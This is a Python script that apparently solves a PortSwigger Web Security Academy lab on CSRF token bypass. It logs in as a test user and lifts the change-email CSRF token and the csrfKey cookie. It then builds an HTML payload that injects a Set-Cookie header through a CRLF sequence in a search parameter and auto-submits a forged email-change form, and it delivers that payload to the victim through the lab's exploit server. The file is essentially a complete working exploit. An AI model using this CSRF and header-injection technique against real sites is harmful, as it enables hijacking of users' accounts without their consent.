import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]


def check_login_and_cookie_getter(session, url, username, password):
    csrf_token = get_csrf_token(session, url)
    resp = session.post(url, data={"csrf": csrf_token, "username": username, "password": password}, verify=False, allow_redirects=False)

    if resp.status_code != 302:
        raise ValueError(f"Login request failed with status code {resp.status_code}")

    session_cookie = resp.cookies.get('session')
    if not session_cookie:
        raise ValueError("Session cookie not found after login")

    return True

def steal_change_email_csrf_token(session, account_url):
    
    resp = session.get(account_url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    form = soup.find("form", {"action": "/my-account/change-email"})
    
    if not form:
        raise ValueError("Unable to find change-email form")
    token_input = form.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token in change-email form")
    return token_input["value"]


def submit_csrf_poc(session, url, payload, form_action):
    params = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": payload,
        "formAction": form_action
    }

    resp = session.post(url, data=params, verify=False, allow_redirects=False)

    if resp.status_code not in (302, 200):
        raise ValueError(f"CSRF POST request failed with status code {resp.status_code}")
    return True


def store_csrf_poc(session, url, payload):
    if submit_csrf_poc(session, url, payload, "STORE"):
        print("CSRF POC stored successfully")
        return True
    return False


def deliver_csrf_poc(session, url, payload):
    if submit_csrf_poc(session, url, payload, "DELIVER_TO_VICTIM"):
        print("CSRF POC delivered to victim")
        return True
    return False


def verify_csrf_poc(session, deliver_url, payload, check_session, check_url):
    if deliver_csrf_poc(session, deliver_url, payload):

        resp = check_session.get(check_url, verify=False, allow_redirects=True)
        if "Congratulations, you solved the lab!" in resp.text:
            print("Lab solved successfully!")
            print("Koated !!!")
            return True
    return False

def main():
    host = "https://0af600b9039132338001803b002b00c8.web-security-academy.net"
    exploit_host = "https://exploit-0ab9000503683233806a7f76017c00f9.exploit-server.net"
    login_url = f"{host}/login"
    account_url = f"{host}/my-account"

    attacker_session = requests.Session()
    exploit_session = requests.Session()


    check_login_and_cookie_getter(attacker_session, login_url, "wiener", "peter")
    stolen_csrf = steal_change_email_csrf_token(attacker_session, account_url)
    csrf_cookie = attacker_session.cookies.get('csrfKey')
    if not csrf_cookie:
        raise ValueError("csrfKey cookie not found after visiting the account page")
    print(f"Stolen CSRF token: {stolen_csrf}")
    print(f"CSRF cookie: {csrf_cookie}")


    payload = f'''
    <html>
<body>
    <form method="POST" action="{host}/my-account/change-email">
        <input type="hidden" name="email" value="pwned3@evil-user.net"/>
        <input type="hidden" name="csrf" value="{stolen_csrf}"/>
        <input type="submit" value="Submit">
    </form>

    <img src="{host}/?search=test%0d%0aSet-Cookie:%20csrfKey={csrf_cookie}%3b%20SameSite=None" onerror="document.forms[0].submit()">

</body>
</html>
    '''

    if store_csrf_poc(exploit_session, f"{exploit_host}/", payload):
        verify_csrf_poc(exploit_session, f"{exploit_host}/", payload, attacker_session, f"{host}/")


if __name__ == "__main__":
    main()